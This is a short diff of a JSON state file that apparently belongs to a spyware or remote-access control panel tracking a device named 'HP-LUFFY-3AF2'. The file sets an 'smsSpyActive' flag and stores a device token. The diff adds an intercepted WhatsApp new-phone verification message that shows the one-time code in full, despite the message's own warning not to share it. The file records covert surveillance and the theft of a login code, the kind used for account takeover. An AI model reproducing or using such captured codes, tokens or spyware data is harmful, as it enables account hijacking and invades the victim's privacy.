@@ -2000,7 +2000,7 @@
     "deviceName": "HP-LUFFY-3AF2",
     "ownerUsername": "ziwoo",
     "token": "8577ec8c6cde38b8fe0a65278f547c49",
-    "lastSeen": 1777600558791,
+    "lastSeen": 1777600569040,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-05-01T01:39:27.608Z",
@@ -2016,6 +2016,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Kode untuk telepon baru",
+        "content": "Jangan bagikan dengan siapa pun. Kode Anda adalah ‪401-387‬.",
+        "time": "01/05 09:56",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777600569475
+      },
       {
         "appName": "WhatsApp",
         "sender": "Zal",
